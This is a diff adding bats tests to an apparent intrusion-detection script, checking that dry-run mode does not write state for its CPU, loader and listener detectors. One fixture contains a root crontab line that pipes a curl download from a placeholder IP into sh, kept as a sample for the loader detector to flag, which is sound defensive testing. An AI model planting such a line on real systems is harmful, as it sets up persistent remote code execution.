@@ -451,3 +451,42 @@ teardown() {
   [ "$status" -eq 0 ]
   [[ "$output" == *"root crontab"* ]]
 }
+
+@test "dry run: the CPU sustain counter does not advance" {
+  SPAWNED="$(spawn_busy)"
+  fixture ps_cpu "$SPAWNED burner 99.0"
+  CPU_THRESHOLD=1
+  CPU_SUSTAIN_SAMPLES=2
+  DRY_RUN=1
+
+  run detect_high_cpu
+  [ -z "$output" ]
+  run detect_high_cpu
+  [ -z "$output" ]              # would have fired on the second pass if it persisted
+  [ ! -f "$CPU_STATE_FILE" ]
+}
+
+@test "dry run: the loader dedupe set is not written" {
+  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
+  _loader_sources() {
+    printf 'root crontab\t%s\n' '*/5 * * * * curl -s http://198.51.100.9/x | sh'
+  }
+  DRY_RUN=1
+
+  run detect_loader
+  [[ "$output" == *"SOFT|loader"* ]]
+  [ ! -f "$LOADER_SEEN_FILE" ]
+
+  run detect_loader
+  [[ "$output" == *"SOFT|loader"* ]]     # still reported, nothing was remembered
+}
+
+@test "dry run: the listener baseline is not seeded" {
+  rm -f "$STATE_DIR/baseline/listeners"
+  fixture ss_listen 'LISTEN 0 4096 0.0.0.0:22 0.0.0.0:*'
+  DRY_RUN=1
+
+  run detect_new_listener
+  [[ "$output" != *"SOFT|new_listener"* ]]
+  [ ! -f "$STATE_DIR/baseline/listeners" ]
+}
